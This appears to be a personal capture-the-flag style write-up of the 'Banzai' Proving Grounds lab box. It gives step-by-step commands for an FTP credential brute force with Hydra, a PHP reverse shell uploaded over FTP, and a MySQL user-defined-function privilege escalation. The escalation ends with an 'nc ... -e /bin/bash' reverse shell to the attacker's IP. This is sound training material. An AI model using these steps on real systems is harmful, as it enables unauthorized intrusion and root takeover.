---
Alias: Banzai
Date: 6/5/2022
Platform: Linux
Difficulty: Intermediate
Tags: #MYSQLuserDefinedFunctionsPrivilegeEscalation #ftpUploadReverseShell #BruteforceCommonFTPcredentialsFTPserver
Status: Finished
IP: 192.168.189.56
---

# {{Banzai}}


# Resolution summary
- Bruteforced ftp server utilizing Hydra utilizing common ftp credentials
- Found directories we can navigate to from webpages
- Uploaded php reverse shell to directory in ftp server
- Navigated to webpage and clicked the reverse shell and received a shell
- Found mysql port 3306 was running as local host on target machine
- Found root credntials for mysql in config file
- Googled mysql root privilege escalation and found steps to escalate privileges with MYSQL User Defined Functions
- Followed the step to escalate privieges and received a root  shell

## Improved skills
- Bruteforing common ftp credentials for ftp server
- Uploading php reverse shell to ftp server
- Reading config files to find credentials
- Root privileges for mysql User Defined Functions Privilege Escalation

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash
Nmap 7.92 scan initiated Tue Mar 15 04:10:01 2022 as: nmap --open -Pn -sV -sC -p 21,22,25,5432,8080 -oN 192.168.189.56/recon/nmap_detailed_TCP_Quick -oX 192.168.189.56/recon/xml_nmap/nmap_detailed_TCP_Quick_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.16s latency).
 
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
7
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 15 04:10:17 2022 -- 1 IP address (1 host up) scanned in 17.16 seconds



Nmap 7.92 scan initiated Tue Mar 15 04:09:53 2022 as: nmap --open -sS -Pn -p- -oN 192.168.189.56/recon/nmap_full -oX 192.168.189.56/recon/xml_nmap/nmap_full_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.085s latency).
Not shown: 65528 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
5432/tcp open  postgresql
8080/tcp open  http-proxy
8295/tcp open  unknown
 
# Nmap done at Tue Mar 15 04:13:29 2022 -- 1 IP address (1 host up) scanned in 216.22 seconds
```

Enumerated open TCP ports:
```bash
21
8295
3306
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8295

#### Per the previous NMAP scan found port 8295 which runs HTTP

#### Typed "sudo gobuster dir -u http://192.168.189.56:8295 -w /usr/share/dirb/wordlists/common.txt -e -k -t50 -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/Downloads/ProvingGroundsBoxes/Banzai/tcp_8295_http_common.txt" and found the following directory's I have access to:

![](Pasted%20image%2020220930213106.png)

![](../Images/Pasted%20image%2020220605134629.png)

## Port 21

#### Per the previous NMAP scan found port 21 (FTP) (not allowed to log in with anonymous)

#### Navigated to "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and cat'd the file and placed the usernames:passwords into a file named "ftp_common_passwords.txt"

![](../Images/Pasted%20image%2020220605134715.png)
![](../Images/Pasted%20image%2020220605134810.png)
![](../Images/Pasted%20image%2020220605134818.png)

#### Typed "hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp" which "-C" flag allows inputting a username and password with the following combo list:
"username:password" and found ftp server username is "admin" and password is "admin"

![](../Images/Pasted%20image%2020220605134846.png)

---

# Exploitation
## PHP Reverse Shell Upload Onto FTP Server

#### Logged into ftp server with username "admin" and password "admin" and found directory "/js" found accessible in the gobuster scan above:

![](../Images/Pasted%20image%2020220605134936.png)

#### Typed "lcd" in ftp server and found I was in local directory "/home/kali":

![](../Images/Pasted%20image%2020220605135123.png)

#### Created php pentest reverse shell script in vim file named "reverse_shell.php" on my kali machine in the "/home/kali"directory

#### Navigated to directory "/js" in ftp server:

#### Typed "mput reverse_shell.php" to upload the reverse shell into the ftp server on directory "/js":

![](../Images/Pasted%20image%2020220605135414.png)

#### Navigated to http://192.168.143.56:8295/js/ and found the reverse shell uploaded on the page and clicked the link and received a reverse shell on penelope:

![](../Images/Pasted%20image%2020220605135439.png)
![](../Images/Pasted%20image%2020220605135448.png)


---


# Privilege Escalation
## Local Enumeration

#### Navigated to directory "/var/www" and found "config.php" file and cat'd the file and found user "root" and password "EscalateRaftHubris123":

![](../Images/Pasted%20image%2020220605135538.png)

#### Typed "netsat –tulpn" and found port "3306" (mysql) listening on localhost:

![](../Images/Pasted%20image%2020220605135719.png)

## Port 3306

#### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123":

![](../Images/Pasted%20image%2020220605135743.png)



## Privilege Escalation vector
## Root Mysql User-Defined Functions 

#### Googled "mysql root privilege escalation" as I was able to login with root in Mysql and found the following webpage listing the steps to escalate privileges:

![](../Images/Pasted%20image%2020220605141120.png)
![](../Images/Pasted%20image%2020220605150109.png)
![](../Images/Pasted%20image%2020220605150123.png)
![](../Images/Pasted%20image%2020220605150134.png)
![](../Images/Pasted%20image%2020220605150150.png)
![](../Images/Pasted%20image%2020220605150158.png)

#### Typed "searchsploit -m linux/local/1518.c" to place exploit on my kali machine

#### Started a http server on my kali machine to host the "1518.c" file

#### Navigated to "/var/www" directory on target machine as it was writeable

#### Typed "wget [kali IP]:8295/1518.c" and the shared object file was downloaded to the target machine

#### Typed "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" and then "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to be compiled into a shared object file

#### Typed "mysql –u root –p" and logged in with the found password for mysql "EscalateRaftHubris123" to login into mysql:

![](../Images/Pasted%20image%2020220605152058.png)

#### Typed "show variables like '%plugin%';" to show the current plugin directory in the database

![](../Images/Pasted%20image%2020220605152325.png)

#### Typed "use mysql;"

#### Typed "create table foo(line blob);"

#### Typed "insert into foo values(load_file('/var/www/raptor_udf2.so'));"

#### Typed "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"

#### Typed "create function do_system returns integer soname 'raptor_udf2.so';"

#### Typed "select * from mysql.func;" to conirm the "raptor_udf2.so" shared object file got placed in the do_system function table:

![](../Images/Pasted%20image%2020220605153153.png)

#### Started a netcat listner on my kali machine listening on port 8295

#### Typed "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" in mysql database on target machine and received a root shell:

![](../Images/Pasted%20image%2020220605153640.png)


---
